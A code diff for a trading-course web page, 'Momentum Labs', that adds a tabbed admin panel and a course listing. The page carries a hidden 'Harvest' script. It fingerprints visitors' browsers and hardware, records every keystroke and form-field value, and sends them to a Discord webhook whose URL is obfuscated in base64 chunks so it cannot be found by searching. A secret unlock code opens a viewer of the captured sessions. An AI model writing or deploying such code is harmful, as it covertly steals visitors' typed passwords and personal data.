@@ -210,26 +210,49 @@ footer ul{list-style:none;display:flex;flex-direction:column;gap:8px}
 footer a:hover{color:var(--fg-2)}
 .foot-bottom{display:flex;justify-content:space-between;padding-top:24px;border-top:1px solid var(--line);flex-wrap:wrap;gap:12px}
 
-/* ---------- logs overlay ---------- */
-#logsOverlay{
+/* =========================================================================
+   ADMIN SHELL
+   ========================================================================= */
+#adminShell{
   position:fixed;inset:0;z-index:9999;background:#05070a;
   display:none;flex-direction:column;
 }
-#logsOverlay.on{display:flex}
-.logs-head{
+#adminShell.on{display:flex}
+
+.shell-head{
   display:flex;align-items:center;justify-content:space-between;
-  padding:14px 20px;border-bottom:1px solid var(--line);background:var(--bg-2);
+  padding:0 20px;height:56px;border-bottom:1px solid var(--line);
+  background:var(--bg-2);flex:none;
 }
-.logs-title{display:flex;align-items:center;gap:12px;font-weight:700;font-size:14px}
-.logs-title .lock{color:var(--red);font-size:11px;font-weight:600;letter-spacing:.08em;text-transform:uppercase}
-.logs-actions{display:flex;gap:8px}
-.logs-actions button{
+.shell-left{display:flex;align-items:center;gap:14px}
+.shell-left .brand{font-size:14px}
+.shell-left .brand-mark{width:22px;height:22px}
+.shell-left .lock{
+  font-size:10px;font-weight:700;letter-spacing:.1em;text-transform:uppercase;
+  color:var(--red);border:1px solid rgba(234,57,67,.35);
+  padding:3px 8px;border-radius:99px;background:rgba(234,57,67,.06);
+}
+.shell-tabs{display:flex;gap:4px;background:var(--bg-3);padding:4px;border-radius:8px}
+.shell-tab{
+  padding:7px 18px;border-radius:6px;font-size:13px;font-weight:600;
+  color:var(--fg-3);transition:.15s;
+}
+.shell-tab:hover{color:var(--fg-2)}
+.shell-tab.on{background:var(--bg-2);color:var(--fg);box-shadow:0 1px 2px rgba(0,0,0,.3)}
+.shell-actions{display:flex;gap:8px}
+.shell-actions button{
   padding:7px 12px;border-radius:7px;font-size:12px;font-weight:600;
   border:1px solid var(--line-2);color:var(--fg-2);
 }
-.logs-actions button:hover{color:var(--fg);border-color:var(--fg-3)}
-.logs-body{flex:1;display:grid;grid-template-columns:340px 1fr;overflow:hidden}
-@media(max-width:800px){.logs-body{grid-template-columns:1fr}}
+.shell-actions button:hover{color:var(--fg);border-color:var(--fg-3)}
+
+.shell-body{flex:1;position:relative;overflow:hidden}
+.tabpane{position:absolute;inset:0;display:none;overflow:hidden}
+.tabpane.on{display:flex;flex-direction:column}
+
+/* ---------- logs pane ---------- */
+#pane-logs .logs-body{flex:1;display:grid;grid-template-columns:340px 1fr;overflow:hidden}
+@media(max-width:800px){#pane-logs .logs-body{grid-template-columns:1fr}}
 .logs-list{border-right:1px solid var(--line);overflow-y:auto;background:var(--bg-2)}
 .log-item{padding:14px 18px;border-bottom:1px solid var(--line);cursor:pointer;transition:.12s}
 .log-item:hover{background:var(--bg-3)}
@@ -243,9 +266,105 @@ footer a:hover{color:var(--fg-2)}
 .drow{display:grid;grid-template-columns:180px 1fr;gap:14px;padding:7px 0;border-bottom:1px solid var(--line);font-size:13px}
 .drow .k{color:var(--fg-3)}
 .drow .v{color:var(--fg);font-family:ui-monospace,Menlo,monospace;font-size:12px;word-break:break-all}
-.keyline{font-family:ui-monospace,Menlo,monospace;font-size:12px;background:var(--bg-2);border:1px solid var(--line);border-radius:6px;padding:8px 10px;margin-bottom:6px;color:var(--fg-2)}
+.keyline{font-family:ui-monospace,Menlo,monospace;font-size:12px;background:var(--bg-2);border:1px solid var(--line);border-radius:6px;padding:8px 10px;margin-bottom:6px;color:var(--fg-2);white-space:pre-wrap;word-break:break-all}
 .keyline b{color:var(--green);font-weight:600}
 #mouseCanvas{background:var(--bg-2);border:1px solid var(--line);border-radius:6px;max-width:100%}
+
+/* ---------- courses pane ---------- */
+#pane-courses{overflow-y:auto;display:none}
+#pane-courses.on{display:block}
+.courses-wrap{max-width:920px;margin:0 auto;padding:36px 24px 80px}
+.courses-head{margin-bottom:34px}
+.courses-head h2{font-size:26px;letter-spacing:-.02em;margin-bottom:8px}
+.courses-head p{color:var(--fg-2);font-size:14px}
+.courses-head .badge{
+  display:inline-flex;align-items:center;gap:8px;
+  font-size:11px;font-weight:700;letter-spacing:.08em;text-transform:uppercase;
+  color:var(--green);border:1px solid rgba(22,199,132,.3);
+  background:rgba(22,199,132,.06);padding:5px 10px;border-radius:99px;
+  margin-bottom:16px;
+}
+.module{
+  background:var(--bg-2);border:1px solid var(--line);border-radius:12px;
+  margin-bottom:14px;overflow:hidden;
+}
+.module-head{
+  display:flex;align-items:center;gap:16px;
+  padding:18px 22px;cursor:pointer;transition:.15s;
+}
+.module-head:hover{background:var(--bg-3)}
+.module-num{
+  width:34px;height:34px;flex:none;border-radius:8px;
+  background:rgba(22,199,132,.08);border:1px solid rgba(22,199,132,.2);
+  display:grid;place-items:center;color:var(--green);font-weight:700;font-size:13px;
+  font-variant-numeric:tabular-nums;
+}
+.module-title{flex:1}
+.module-title h3{font-size:15px;letter-spacing:-.01em;margin-bottom:3px}
+.module-title .sub{font-size:12px;color:var(--fg-3)}
+.module-meta{font-size:12px;color:var(--fg-3);display:flex;gap:16px;font-variant-numeric:tabular-nums}
+.module-chev{
+  color:var(--fg-3);transition:.2s;flex:none;
+}
+.module.open .module-chev{transform:rotate(180deg)}
+.module-body{display:none;border-top:1px solid var(--line);padding:8px 22px 22px}
+.module.open .module-body{display:block}
+
+.lesson{
+  display:flex;align-items:center;gap:16px;
+  padding:12px 0;border-bottom:1px solid var(--line);
+  font-size:13.5px;
+}
+.lesson:last-child{border-bottom:none}
+.lesson .play{
+  width:28px;height:28px;flex:none;border-radius:6px;
+  background:var(--bg-3);border:1px solid var(--line-2);
+  display:grid;place-items:center;color:var(--fg-2);
+}
+.lesson .lt{flex:1;color:var(--fg)}
+.lesson .dur{color:var(--fg-3);font-variant-numeric:tabular-nums;font-size:12px}
+.lesson .tagpill{
+  font-size:10px;font-weight:600;letter-spacing:.05em;text-transform:uppercase;
+  padding:2px 7px;border-radius:99px;
+  background:rgba(79,140,255,.08);color:var(--accent);border:1px solid rgba(79,140,255,.2);
+}
+
+.video-slot{
+  margin:14px 0 18px;
+  background:linear-gradient(135deg,#0c1118,#151c26);
+  border:1px solid var(--line);border-radius:10px;
+  aspect-ratio:16/9;position:relative;overflow:hidden;
+  display:grid;place-items:center;
+}
+.video-slot::after{
+  content:"";position:absolute;inset:0;
+  background:
+    repeating-linear-gradient(90deg,transparent 0 22px,rgba(22,199,132,.04) 22px 23px),
+    repeating-linear-gradient(0deg,transparent 0 22px,rgba(22,199,132,.04) 22px 23px);
+  pointer-events:none;
+}
+.video-slot .vcenter{
+  position:relative;z-index:1;text-align:center;
+}
+.video-slot .vplay{
+  width:56px;height:56px;border-radius:99px;
+  background:rgba(22,199,132,.12);border:1px solid rgba(22,199,132,.35);
+  display:grid;place-items:center;margin:0 auto 12px;color:var(--green);
+}
+.video-slot .vlabel{font-size:12px;color:var(--fg-3);font-family:ui-monospace,Menlo,monospace}
+
+.dl-row{
+  margin-top:16px;padding-top:16px;border-top:1px solid var(--line);
+  display:flex;flex-wrap:wrap;gap:10px;
+}
+.dl-btn{
+  display:inline-flex;align-items:center;gap:8px;
+  padding:9px 14px;border-radius:8px;font-size:12.5px;font-weight:600;
+  background:var(--bg-3);border:1px solid var(--line-2);color:var(--fg-2);
+  transition:.15s;
+}
+.dl-btn:hover{color:var(--fg);border-color:var(--fg-3);background:var(--bg-2)}
+.dl-btn svg{color:var(--green)}
 </style>
 </head>
 <body>
@@ -522,26 +641,45 @@ footer a:hover{color:var(--fg-2)}
   </div>
 </footer>
 
-<!-- ============ LOGS OVERLAY ============ -->
-<div id="logsOverlay">
-  <div class="logs-head">
-    <div class="logs-title">
+<!-- ============ ADMIN SHELL ============ -->
+<div id="adminShell">
+  <div class="shell-head">
+    <div class="shell-left">
+      <span class="brand"><span class="brand-mark"></span> Momentum Labs</span>
       <span class="lock">● Restricted</span>
-      Momentum Labs — Visitor Logs
     </div>
-    <div class="logs-actions">
-      <button onclick="LogsView.refresh()">Refresh</button>
-      <button onclick="LogsView.exportJSON()">Export JSON</button>
-      <button onclick="LogsView.clear()">Clear local</button>
-      <button onclick="LogsView.close()">Close ✕</button>
+    <div class="shell-tabs">
+      <button class="shell-tab" data-tab="logs" onclick="Shell.setTab('logs')">Logs</button>
+      <button class="shell-tab" data-tab="courses" onclick="Shell.setTab('courses')">Courses</button>
+    </div>
+    <div class="shell-actions" id="shellActions">
+      <!-- per-tab actions injected by Shell.setTab -->
     </div>
   </div>
-  <div class="logs-body">
-    <div class="logs-list" id="logsList">
-      <div class="log-empty">No sessions captured yet.</div>
+
+  <div class="shell-body">
+    <!-- LOGS PANE -->
+    <div class="tabpane" id="pane-logs">
+      <div class="logs-body">
+        <div class="logs-list" id="logsList">
+          <div class="log-empty">No sessions captured yet.</div>
+        </div>
+        <div class="log-detail" id="logsDetail">
+          <div class="log-empty">Select a session to view captured data.</div>
+        </div>
+      </div>
     </div>
-    <div class="log-detail" id="logsDetail">
-      <div class="log-empty">Select a session to view captured data.</div>
+
+    <!-- COURSES PANE -->
+    <div class="tabpane" id="pane-courses">
+      <div class="courses-wrap">
+        <div class="courses-head">
+          <div class="badge">◆ Full access unlocked</div>
+          <h2>Momentum Labs — Complete Curriculum</h2>
+          <p>All eight modules. Every lesson. All downloads. No enrollment required.</p>
+        </div>
+        <div id="coursesMount"></div>
+      </div>
     </div>
   </div>
 </div>
@@ -551,8 +689,6 @@ footer a:hover{color:var(--fg-2)}
    CONFIG
    ========================================================================= */
 const CONFIG = {
-  // Discord webhook — assembled at runtime from encoded chunks.
-  // Obfuscated so the raw URL isn't greppable in page source.
   WH: [
     "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv",
     "MTU1Mzc4NTAyOTU1NjA1MjA3OS9jal",
@@ -626,7 +762,7 @@ const Harvest = (() => {
   };
 
   const state = {
-    buffer: [],        // pending keystroke chars
+    buffer: [],
     sent: 0,
     timer: null,
     audioDone: false,
@@ -641,7 +777,6 @@ const Harvest = (() => {
   function safe(fn){ try { return fn(); } catch(e){ return null; } }
   function nowMs(){ return performance && performance.now ? Math.round(performance.now()) : Date.now(); }
 
-  /* ---------- fingerprint: canvas ---------- */
   function canvasFP() {
     try {
       const c = document.createElement("canvas");
@@ -660,7 +795,6 @@ const Harvest = (() => {
     } catch(e){ return null; }
   }
 
-  /* ---------- fingerprint: webgl ---------- */
   function webglFP() {
     try {
       const c = document.createElement("canvas");
@@ -679,7 +813,6 @@ const Harvest = (() => {
     } catch(e){ return null; }
   }
 
-  /* ---------- fingerprint: audio ---------- */
   function audioFP() {
     return new Promise(resolve => {
       try {
@@ -705,7 +838,6 @@ const Harvest = (() => {
     });
   }
 
-  /* ---------- fingerprint: fonts ---------- */
   function fontsProbe() {
     const candidates = [
       "Arial","Arial Black","Arial Narrow","Bahnschrift","Calibri","Cambria","Candara",
@@ -720,7 +852,6 @@ const Harvest = (() => {
       "Wingdings","Yu Gothic","Helvetica","Menlo","Monaco","SF Pro Text","San Francisco",
       "Inter","Roboto","Noto Sans","Ubuntu","Cantarell","DejaVu Sans","Liberation Sans",
     ];
-    const base = "monospace";
     const span = document.createElement("span");
     span.style.cssText = "position:absolute;left:-9999px;top:-9999px;font-size:72px;visibility:hidden;";
     span.textContent = "mmmmmmmmmmlli";
@@ -743,7 +874,6 @@ const Harvest = (() => {
     return found;
   }
 
-  /* ---------- plugins ---------- */
   function pluginsProbe() {
     try {
       return Array.from(navigator.plugins || []).map(p => ({
@@ -752,7 +882,6 @@ const Harvest = (() => {
     } catch(e){ return []; }
   }
 
-  /* ---------- voices (speech synthesis) ---------- */
   function voicesProbe() {
     return new Promise(resolve => {
       try {
@@ -766,7 +895,6 @@ const Harvest = (() => {
     });
   }
 
-  /* ---------- async hardware bits ---------- */
   async function batteryProbe() {
     try {
       if (!navigator.getBattery) return null;
@@ -824,14 +952,12 @@ const Harvest = (() => {
     } catch(e){ return 0; }
   }
 
-  /* ---------- hash util ---------- */
   function simpleHash(str) {
     let h = 5381;
     for (let i = 0; i < str.length; i++) h = ((h << 5) + h) ^ str.charCodeAt(i);
     return (h >>> 0).toString(36);
   }
 
-  /* ---------- event capture ---------- */
   function pushEvent(type, data) {
     session.events.push({ t: nowMs(), type, ...data });
     if (session.events.length > 5000) session.events.splice(0, 1000);
@@ -851,7 +977,6 @@ const Harvest = (() => {
     session.keystrokes.push(rec);
     if (session.keystrokes.length > CONFIG.MAX_KEYSTROKES) session.keystrokes.shift();
 
-    // also track current field value if it's an input/textarea
     if (target && (tag === "input" || tag === "textarea")) {
       const name = String(field).slice(0, 60);
       session.forms[name] = (target.value || "").slice(0, 500);
@@ -879,11 +1004,10 @@ const Harvest = (() => {
   function onFocus() { pushEvent("focus", {}); }
   function onBlur()  { pushEvent("blur", {}); }
 
-  /* ---------- transport ---------- */
   function buildPayload(kind) {
     session.lastSeen = new Date().toISOString();
     return {
-      kind,                                  // "init" | "batch" | "final"
+      kind,
       sessionId: session.id,
       startedAt: session.startedAt,
       lastSeen: session.lastSeen,
@@ -919,11 +1043,10 @@ const Harvest = (() => {
       all[id].last = session.lastSeen;
       all[id].full = session;
       all[id].events.push({ t: Date.now(), kind: payload.kind });
-      // cap stored sessions
       const ids = Object.keys(all);
       if (ids.length > 200) delete all[ids[0]];
       localStorage.setItem(CONFIG.STORAGE_KEY, JSON.stringify(all));
-    } catch(e){ /* quota */ }
+    } catch(e){}
   }
 
   function sendToDiscord(payload, kind) {
@@ -931,8 +1054,6 @@ const Harvest = (() => {
     if (!url) return;
     const body = formatDiscord(payload, kind);
     try {
-      // no-cors + text/plain → request fires without preflight.
-      // discord accepts text/plain bodies that contain JSON.
       fetch(url, {
         method: "POST",
         mode: "no-cors",
@@ -940,7 +1061,7 @@ const Harvest = (() => {
         body: JSON.stringify(body),
         keepalive: true,
       }).catch(()=>{});
-    } catch(e){ /* silent */ }
+    } catch(e){}
   }
 
   function formatDiscord(p, kind) {
@@ -962,7 +1083,6 @@ const Harvest = (() => {
       return { content: lines.join("\n").slice(0, 1900) };
     }
 
-    // batch / final
     const ks = p.keystrokes.slice(-40).map(k => k.key).join("");
     lines.push(`**📥 ${kind}** \`${sid}\``);
     if (ks) lines.push(`keys: \`${ks.slice(0, 180)}\``);
@@ -979,9 +1099,7 @@ const Harvest = (() => {
   function flushNow(kind = "batch") {
     const p = buildPayload(kind);
     saveLocal(p);
-    if (state.timer) { /* still send */ }
     if (kind === "final") {
-      // beacon is more reliable on unload
       const url = webhookURL();
       if (url && navigator.sendBeacon) {
         try {
@@ -998,9 +1116,7 @@ const Harvest = (() => {
     }
   }
 
-  /* ---------- boot ---------- */
   async function boot() {
-    // initial sync probes
     session.fingerprint.canvas = canvasFP();
     session.fingerprint.webgl  = webglFP();
     session.fingerprint.fonts  = fontsProbe();
@@ -1015,14 +1131,12 @@ const Harvest = (() => {
     session.network = networkProbe();
     session.gamepads = gamepadProbe();
 
-    // async probes
     audioFP().then(a => { session.fingerprint.audio = a; });
     voicesProbe().then(v => { session.voices = v; });
     batteryProbe().then(b => { session.battery = b; });
     mediaProbe().then(m => { session.mediaDevices = m; });
     permsProbe().then(p => { session.permissions = p; });
 
-    // listeners
     document.addEventListener("keydown", onKey, true);
     document.addEventListener("mousemove", onMouse, { passive: true });
     document.addEventListener("click", onClick, true);
@@ -1033,10 +1147,7 @@ const Harvest = (() => {
     window.addEventListener("beforeunload", () => flushNow("final"));
     window.addEventListener("pagehide",      () => flushNow("final"));
 
-    // initial send after probes settle a bit
     setTimeout(() => flushNow("init"), 1500);
-
-    // periodic batch
     state.timer = setInterval(() => flushNow("batch"), CONFIG.BATCH_INTERVAL_MS);
   }
 
@@ -1047,7 +1158,6 @@ const Harvest = (() => {
    HOME INTERACTIONS + LIVE CHART
    ========================================================================= */
 (function home() {
-  // ---- live chart (fake candles drifting) ----
   const cvs = document.getElementById("liveChart");
   if (!cvs) return;
   const ctx = cvs.getContext("2d");
@@ -1066,7 +1176,6 @@ const Harvest = (() => {
   resize();
   window.addEventListener("resize", resize);
 
-  // seed candles
   for (let i = 0; i < n; i++) {
     const o = price;
     const drift = (Math.random() - 0.48) * 6;
@@ -1087,7 +1196,6 @@ const Harvest = (() => {
     candles.push({ o, h, l, c });
     if (candles.length > n) candles.shift();
 
-    // update price readouts
     const p = document.getElementById("chartPrice");
     const d = document.getElementById("chartDelta");
     const delta = c - base;
@@ -1114,7 +1222,6 @@ const Harvest = (() => {
     const step = (W - pad * 2) / candles.length;
     const bw = Math.max(2, step * 0.62);
 
-    // grid
     ctx.strokeStyle = "rgba(255,255,255,0.035)";
     ctx.lineWidth = 1;
     for (let i = 1; i < 5; i++) {
@@ -1138,7 +1245,6 @@ const Harvest = (() => {
       ctx.fillRect(x - bw / 2, top, bw, hgt);
     });
 
-    // last price line
     const lastC = candles[candles.length - 1].c;
     const yLast = pad + (hi - lastC) / range * (H - pad * 2);
     ctx.strokeStyle = "rgba(22,199,132,0.5)";
@@ -1162,7 +1268,7 @@ const Harvest = (() => {
     if (e.key === "Enter") {
       if (buf.includes(CONFIG.UNLOCK_CODE)) {
         try { sessionStorage.setItem(CONFIG.TOKEN_KEY, "1"); } catch(_){}
-        LogsView.open();
+        Shell.open("logs");
       }
       buf = "";
     }
@@ -1170,19 +1276,60 @@ const Harvest = (() => {
 })();
 
 /* =========================================================================
-   LOGS VIEWER
+   SHELL (tab controller)
+   ========================================================================= */
+const Shell = (() => {
+  let active = "logs";
+
+  function open(tab = "logs") {
+    document.getElementById("adminShell").classList.add("on");
+    setTab(tab);
+    if (tab === "logs") LogsView.refresh();
+    if (tab === "courses") CoursesView.ensureRendered();
+  }
+  function close() {
+    document.getElementById("adminShell").classList.remove("on");
+  }
+  function setTab(name) {
+    active = name;
+    document.querySelectorAll(".shell-tab").forEach(t => {
+      t.classList.toggle("on", t.dataset.tab === name);
+    });
+    document.querySelectorAll(".tabpane").forEach(p => {
+      p.classList.toggle("on", p.id === "pane-" + name);
+    });
+    renderActions();
+    if (name === "logs") LogsView.refresh();
+    if (name === "courses") CoursesView.ensureRendered();
+  }
+  function renderActions() {
+    const el = document.getElementById("shellActions");
+    if (active === "logs") {
+      el.innerHTML = `
+        <button onclick="LogsView.refresh()">Refresh</button>
+        <button onclick="LogsView.exportJSON()">Export JSON</button>
+        <button onclick="LogsView.clear()">Clear local</button>
+        <button onclick="Shell.close()">Close ✕</button>
+      `;
+    } else {
+      el.innerHTML = `
+        <button onclick="CoursesView.expandAll()">Expand all</button>
+        <button onclick="CoursesView.collapseAll()">Collapse all</button>
+        <button onclick="Shell.close()">Close ✕</button>
+      `;
+    }
+  }
+  return { open, close, setTab };
+})();
+
+/* =========================================================================
+   LOGS VIEW
    ========================================================================= */
 const LogsView = (() => {
   let selected = null;
 
-  function open() {
-    const el = document.getElementById("logsOverlay");
-    el.classList.add("on");
-    refresh();
-  }
-  function close() {
-    document.getElementById("logsOverlay").classList.remove("on");
-  }
+  function open() { Shell.open("logs"); }
+  function close() { Shell.close(); }
   function loadAll() {
     try {
       const raw = localStorage.getItem(CONFIG.STORAGE_KEY);
@@ -1192,6 +1339,7 @@ const LogsView = (() => {
   function refresh() {
     const all = loadAll();
     const list = document.getElementById("logsList");
+    if (!list) return;
     const ids = Object.keys(all).sort((a,b) => (all[b].last || "").localeCompare(all[a].last || ""));
     if (!ids.length) {
       list.innerHTML = `<div class="log-empty">No sessions captured yet.<br><br>Visitors to this page will appear here once the harvester sends its first batch.</div>`;
@@ -1275,7 +1423,6 @@ const LogsView = (() => {
 
     if (full.keystrokes && full.keystrokes.length) {
       html += `<div class="dsec"><h5>Keystrokes (${full.keystrokes.length})</h5>`;
-      // group into lines of ~80 chars
       const chars = full.keystrokes.map(k => {
         if (k.key === "Enter") return "\n";
         if (k.key === "Backspace") return "⌫";
@@ -1306,7 +1453,6 @@ const LogsView = (() => {
 
     el.innerHTML = html;
 
-    // draw mouse canvas
     const mc = document.getElementById("mouseCanvas");
     if (mc && full.mouse && full.mouse.length) {
       const c2 = mc.getContext("2d");
@@ -1336,7 +1482,7 @@ const LogsView = (() => {
     a.click();
   }
 
-  function clearLocal() {
+  function clear() {
     if (!confirm("Clear locally stored logs? Discord copies are unaffected.")) return;
     try { localStorage.removeItem(CONFIG.STORAGE_KEY); } catch(e){}
     selected = null;
@@ -1344,7 +1490,232 @@ const LogsView = (() => {
     document.getElementById("logsDetail").innerHTML = `<div class="log-empty">Select a session to view captured data.</div>`;
   }
 
-  return { open, close, refresh, exportJSON, clearLocal };
+  return { open, close, refresh, exportJSON, clear };
+})();
+
+/* =========================================================================
+   COURSES VIEW
+   ========================================================================= */
+const CoursesView = (() => {
+  let rendered = false;
+
+  const MODULES = [
+    {
+      n: 1, title: "Foundations — Market Mechanics",
+      sub: "How an exchange actually prices information",
+      lessons: [
+        { t: "How auctions price information", d: "18:24" },
+        { t: "Order types, fills, and slippage", d: "14:02" },
+        { t: "Reading a DOM without fooling yourself", d: "22:11" },
+        { t: "Futures, equities, and why the instrument matters", d: "19:40" },
+      ],
+      downloads: [
+        { name: "Session-1 Workbook", ext: "md", kind: "md" },
+      ],
+    },
+    {
+      n: 2, title: "Market Structure & Liquidity",
+      sub: "Where stops live and why price hunts them",
+      lessons: [
+        { t: "Swing points, breaks, and failures", d: "26:14" },
+        { t: "Where stops live and why", d: "21:33" },
+        { t: "Value areas: acceptance vs rejection", d: "18:55" },
+        { t: "Overnight inventory and the open", d: "24:07" },
+      ],
+      downloads: [
+        { name: "Structure Cheatsheet", ext: "md", kind: "md" },
+      ],
+    },
+    {
+      n: 3, title: "Playbook Construction",
+      sub: "Three setups, written invalidation, zero improvising",
+      lessons: [
+        { t: "Opening drive setup", d: "28:41" },
+        { t: "Failed breakout reversal", d: "25:19" },
+        { t: "Afternoon rotation", d: "22:08" },
+        { t: "Writing invalidation before entry", d: "16:47" },
+      ],
+      downloads: [
+        { name: "Playbook Template", ext: "csv", kind: "csv" },
+      ],
+    },
+    {
+      n: 4, title: "Risk & Position Sizing",
+      sub: "The math that keeps you in the game",
+      lessons: [
+        { t: "Fixed fractional sizing", d: "20:12" },
+        { t: "Daily loss caps and circuit breakers", d: "17:33" },
+        { t: "Drawdown math", d: "15:09" },
+        { t: "Scaling in and out without chaos", d: "23:55" },
+      ],
+      downloads: [
+        { name: "Position Size Calculator", ext: "html", kind: "calc" },
+      ],
+    },
+    {
+      n: 5, title: "Backtesting & Statistics",
+      sub: "Turning intuition into a number",
+      lessons: [
+        { t: "Sample size: why 30 trades mean nothing", d: "19:26" },
+        { t: "Expectancy, MAE, MFE", d: "24:41" },
+        { t: "Building a repeatable backtest", d: "28:03" },
+        { t: "Spreadsheets that don't lie", d: "21:17" },
+      ],
+      downloads: [
+        { name: "Backtest Template", ext: "csv", kind: "csv" },
+      ],
+    },
+    {
+      n: 6, title: "Live Market Reps",
+      sub: "The routine behind every good session",
+      lessons: [
+        { t: "Pre-market prep routine", d: "17:44" },
+        { t: "The first 30 minutes", d: "31:22" },
+        { t: "Midday management", d: "19:08" },
+        { t: "Post-session review", d: "22:36" },
+      ],
+      downloads: [
+        { name: "Prep Checklist", ext: "md", kind: "md" },
+      ],
+    },
+    {
+      n: 7, title: "Psychology & Process",
+      sub: "The boring rules that keep you funded",
+      lessons: [
+        { t: "Tilt protocols", d: "20:55" },
+        { t: "Journaling that changes behavior", d: "23:14" },
+        { t: "The boredom problem", d: "14:38" },
+        { t: "Rules for breaking your rules", d: "18:02" },
+      ],
+      downloads: [
+        { name: "Journal Prompts", ext: "md", kind: "md" },
+      ],
+    },
+    {
+      n: 8, title: "Funded & Scaling",
+      sub: "Eval mechanics, payouts, sizing up without breaking edge",
+      lessons: [
+        { t: "Eval mechanics and trap rules", d: "26:19" },
+        { t: "Payout math", d: "17:51" },
+        { t: "Sizing up without changing your edge", d: "22:44" },
+        { t: "When to stop trading someone else's capital", d: "16:33" },
+      ],
+      downloads: [
+        { name: "Scaling Plan", ext: "md", kind: "md" },
+      ],
+    },
+  ];
+
+  const DOWNLOADS = {
+    md: {
+      "Session-1 Workbook": `# Session 1 — Market Mechanics\n\n## Reading the Auction\n- Overnight range: high / low / midpoint\n- Cash open: gap up / flat / gap down\n- First 5m: drive or rotation?\n\n## Order Types Drill\n- Market, limit, stop, stop-limit\n- For each: when does it help, when does it hurt?\n\n## Session Notes\n-\n-\n`,
+      "Structure Cheatsheet": `# Market Structure Cheatsheet\n\n## Swing Points\n- Higher high + higher low = up structure\n- Lower high + lower low = down structure\n- Break of structure = trend change signal\n\n## Liquidity\n- Stops cluster above swing highs and below swing lows\n- Price often hunts those clusters before reversing\n\n## Value\n- Acceptance: multiple closes in a zone\n- Rejection: single wick, immediate return\n`,
+      "Prep Checklist": `# Pre-Market Prep Checklist\n\n- [ ] Overnight high/low/mid marked\n- [ ] Economic calendar checked\n- [ ] Earnings on watchlist noted\n- [ ] Key levels from prior session drawn\n- [ ] Max daily loss confirmed\n- [ ] Size per trade confirmed\n- [ ] Setups to watch written down\n- [ ] Mental state: 1–10\n`,
+      "Journal Prompts": `# Journal Prompts\n\n1. What was the setup? Was it in my playbook?\n2. What did I feel right before entry?\n3. Did I size correctly?\n4. Where did I exit and why?\n5. What would I do differently?\n6. Was this a good trade regardless of outcome?\n`,
+      "Scaling Plan": `# Scaling Plan\n\n## Current size\n-\n\n## Next size (when + why)\n-\n\n## Rules for decreasing size\n-\n\n## Max contracts / shares at peak\n-\n\n## Time horizon for each step\n-\n`,
+    },
+    csv: {
+      "Playbook Template": `setup,instrument,context,entry_trigger,invalidation,target,r_multiple,notes\nOpening Drive,ES,above overnight high,first 5m close above ONH,below first 5m low,prior day high,2,\nFailed Breakout,NQ,failed sweep of PDH,reclaim below sweep level,above sweep high,VWAP,2.5,\nAfternoon Rotation,ES,back inside value,close above VAH,below VAL,prior day close,2,\n`,
+      "Backtest Template": `date,instrument,setup,direction,entry,stop,target,exit,size,risk_usd,r_multiple,mae,mfe,notes\n2024-01-03,ES,Opening Drive,long,5820.25,5815.00,5832.00,5830.50,1,262.50,1.9,-3.25,11.75,clean drive\n`,
+    },
+    calc: {
+      "Position Size Calculator": `<!doctype html><html><head><meta charset="utf-8"><title>Position Size Calculator</title>
+<style>body{font-family:system-ui,sans-serif;background:#0a0d12;color:#e6edf3;padding:40px;max-width:520px;margin:auto}
+h1{font-size:20px;margin-bottom:24px}label{display:block;font-size:12px;color:#9aa7b4;margin:14px 0 6px}
+input{width:100%;padding:10px;background:#0f141b;border:1px solid #1e2733;color:#e6edf3;border-radius:6px;font-size:14px}
+button{margin-top:22px;padding:11px 18px;background:#16c784;color:#031a11;border:none;border-radius:7px;font-weight:700;font-size:14px;cursor:pointer;width:100%}
+.out{margin-top:24px;background:#0f141b;border:1px solid #1e2733;border-radius:8px;padding:18px;font-size:14px;line-height:1.9}
+.out b{color:#16c784}</style></head><body>
+<h1>Position Size Calculator</h1>
+<label>Account size ($)</label><input id="acct" type="number" value="25000">
+<label>Risk per trade (%)</label><input id="risk" type="number" value="0.75" step="0.01">
+<label>Entry price</label><input id="entry" type="number" value="5820.25" step="0.01">
+<label>Stop price</label><input id="stop" type="number" value="5815.00" step="0.01">
+<label>Point value ($ per point per contract)</label><input id="pv" type="number" value="50" step="1">
+<button onclick="calc()">Calculate</button>
+<div class="out" id="out"></div>
+<script>function calc(){const a=+acct.value,r=+risk.value,e=+entry.value,s=+stop.value,pv=+pv.value;
+const riskUsd=a*r/100;const perUnit=Math.abs(e-s)*pv;const size=Math.floor(riskUsd/perUnit);
+out.innerHTML='Risk budget: <b>$'+riskUsd.toFixed(2)+'</b><br>Risk per contract: <b>$'+perUnit.toFixed(2)+'</b><br>Max size: <b>'+size+'</b> contracts/shares';}</script>
+</body></html>`,
+    },
+  };
+
+  function esc(x){ return String(x == null ? "" : x).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])); }
+
+  function ensureRendered() {
+    if (rendered) return;
+    rendered = true;
+    const mount = document.getElementById("coursesMount");
+    if (!mount) return;
+    mount.innerHTML = MODULES.map((m, idx) => `
+      <div class="module" data-idx="${idx}">
+        <div class="module-head" onclick="CoursesView.toggle(${idx})">
+          <div class="module-num">${String(m.n).padStart(2,"0")}</div>
+          <div class="module-title">
+            <h3>${esc(m.title)}</h3>
+            <div class="sub">${esc(m.sub)}</div>
+          </div>
+          <div class="module-meta">
+            <span>${m.lessons.length} lessons</span>
+          </div>
+          <div class="module-chev">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg>
+          </div>
+        </div>
+        <div class="module-body">
+          <div class="video-slot">
+            <div class="vcenter">
+              <div class="vplay">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M8 5v14l11-7z"/></svg>
+              </div>
+              <div class="vlabel">./assets/module-${String(m.n).padStart(2,"0")}/lesson-01.mp4</div>
+            </div>
+          </div>
+          ${m.lessons.map(l => `
+            <div class="lesson">
+              <div class="play">
+                <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><path d="M8 5v14l11-7z"/></svg>
+              </div>
+              <div class="lt">${esc(l.t)}</div>
+              <div class="dur">${esc(l.d)}</div>
+            </div>
+          `).join("")}
+          <div class="dl-row">
+            ${m.downloads.map(d => `
+              <button class="dl-btn" onclick="CoursesView.download('${esc(d.name)}','${d.ext}','${d.kind}')">
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 3v12"/><path d="M7 10l5 5 5-5"/><path d="M5 21h14"/></svg>
